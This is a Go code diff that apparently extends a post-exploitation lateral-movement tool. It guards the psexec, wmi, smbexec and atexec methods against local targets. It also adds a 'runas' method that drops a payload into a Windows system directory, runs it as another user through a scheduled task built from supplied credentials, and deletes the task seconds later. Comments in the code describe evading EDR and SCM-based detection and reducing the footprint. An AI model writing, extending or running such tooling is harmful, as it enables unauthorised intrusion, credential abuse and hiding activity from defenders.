@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"net"
 	"os"
+	"os/exec"
 	"runtime"
 	"strings"
 	"syscall"
@@ -181,6 +182,9 @@ func smbStage(host, name, user, pass string, data []byte) (string, error) {
 // The SCM entry is deleted immediately after the service starts to reduce
 // footprint (the process continues running).
 func lateralPSExec(host string, data []byte, svcName, user, pass string) (string, error) {
+	if isLocalHost(host) {
+		return "", fmt.Errorf("psexec does not support local targets (Windows blocks SCM auth to self) — use dcom instead")
+	}
 	if svcName == "" {
 		svcName = randSvcName()
 	}
@@ -239,6 +243,9 @@ func lateralPSExec(host string, data []byte, svcName, user, pass string) (string
 // lateralWMI stages data via SMB and spawns it using WMI Win32_Process::Create.
 // Credentials are passed directly to wmic /user /password.
 func lateralWMI(host string, data []byte, svcName, user, pass string) (string, error) {
+	if isLocalHost(host) {
+		return "", fmt.Errorf("wmi does not support local targets (WBEM_E_LOCAL_CREDENTIALS) — use dcom instead")
+	}
 	if svcName == "" {
 		svcName = randSvcName()
 	}
@@ -384,6 +391,9 @@ func scpUpload(client *ssh.Client, data []byte, remotePath string) error {
 // This extra indirection bypasses EDR rules that flag SERVICES.EXE directly
 // spawning unknown binaries (the classic psexec signature).
 func lateralSMBExec(host string, data []byte, svcName, user, pass string) (string, error) {
+	if isLocalHost(host) {
+		return "", fmt.Errorf("smbexec does not support local targets (Windows blocks SCM auth to self) — use dcom instead")
+	}
 	if svcName == "" {
 		svcName = randSvcName()
 	}
@@ -449,6 +459,9 @@ func lateralSMBExec(host string, data []byte, svcName, user, pass string) (strin
 // Execution context: SYSTEM (or specified user), spawned by taskeng.exe/
 // svchost.exe, completely bypassing SCM-based detection.
 func lateralATExec(host string, data []byte, svcName, user, pass string) (string, error) {
+	if isLocalHost(host) {
+		return "", fmt.Errorf("atexec does not support local targets (Windows blocks credential auth to self) — use dcom instead")
+	}
 	if svcName == "" {
 		svcName = randSvcName()
 	}
@@ -529,6 +542,77 @@ func lateralDCOM(host string, data []byte, svcName, user, pass string) (string, 
 	return fmt.Sprintf("[+] dcom → %s\n    path: %s\n%s", host, localPath, strings.TrimSpace(out)), nil
 }
 
+// ── runAs ─────────────────────────────────────────────────────────────────────
+
+// lateralRunAs spawns the payload as a different local user via the Task
+// Scheduler. Unlike WMI/SMBExec/PSExec, this does NOT open a network session
+// to the SCM, so Windows loopback restrictions do not apply. The Task
+// Scheduler service (SYSTEM) validates the credentials and launches the
+// process as the target user.
+//
+// Only works for local targets; use dcom/psexec for remote hosts.
+func lateralRunAs(host string, data []byte, svcName, user, pass string) (string, error) {
+	if !isLocalHost(host) {
+		return "", fmt.Errorf("runas only supports local targets — use psexec/wmi/dcom for remote hosts")
+	}
+	if svcName == "" {
+		svcName = randSvcName()
+	}
+	exeName := svcName + ".exe"
+
+	// Stage payload directly (no SMB loopback issue)
+	localPath := `C:\Windows\Temp\` + exeName
+	if err := os.WriteFile(localPath, data, 0644); err != nil {
+		localPath = `C:\Windows\` + exeName
+		if err2 := os.WriteFile(localPath, data, 0644); err2 != nil {
+			return "", fmt.Errorf("runas: write payload: %w", err)
+		}
+	}
+
+	// Parse domain\user  →  ruAccount for /RU flag
+	domain, username := ".", user
+	if idx := strings.IndexByte(user, '\\'); idx >= 0 {
+		domain, username = user[:idx], user[idx+1:]
+	} else if idx := strings.IndexByte(user, '@'); idx >= 0 {
+		username, domain = user[:idx], user[idx+1:]
+	}
+	// For local accounts (domain "."), use bare username — schtasks on some
+	// Windows versions rejects "." as a domain alias and fails with
+	// ERROR_NONE_MAPPED. Bare username resolves correctly via SAM.
+	var ruAccount string
+	if domain == "." {
+		ruAccount = username
+	} else {
+		ruAccount = domain + `\` + username
+	}
+
+	taskName := svcName
+
+	// Create ephemeral task running as target user
+	out, err := exec.Command("schtasks",
+		"/create",
+		"/RU", ruAccount, "/RP", pass,
+		"/TR", localPath,
+		"/TN", taskName,
+		"/SC", "ONCE", "/ST", "00:00",
+		"/F",
+	).CombinedOutput()
+	if err != nil {
+		return "", fmt.Errorf("runas: schtasks /create: %w\n%s", err, strings.TrimSpace(string(out)))
+	}
+
+	// Run immediately (ignore output — task may already be running)
+	exec.Command("schtasks", "/run", "/TN", taskName).Run()
+
+	// Delete after the process has had time to start
+	go func() {
+		time.Sleep(4 * time.Second)
+		exec.Command("schtasks", "/delete", "/TN", taskName, "/F").Run()
+	}()
+
+	return fmt.Sprintf("[+] runas → %s @ %s\n    path: %s\n    task: %s (deleted in 4s)", ruAccount, host, localPath, taskName), nil
+}
+
 // ── dispatcher ────────────────────────────────────────────────────────────────
 
 // runLateral dispatches to the chosen lateral movement method.
@@ -548,7 +632,9 @@ func runLateral(method, host string, data []byte, svcName, user, pass string) (s
 		return lateralSMBExec(host, data, svcName, user, pass)
 	case "atexec", "at":
 		return lateralATExec(host, data, svcName, user, pass)
+	case "runas":
+		return lateralRunAs(host, data, svcName, user, pass)
 	default:
-		return "", fmt.Errorf("unknown method %q — use psexec|wmi|winrm|ssh|dcom|smbexec|atexec", method)
+		return "", fmt.Errorf("unknown method %q — use psexec|wmi|winrm|ssh|dcom|smbexec|atexec|runas", method)
 	}
 }
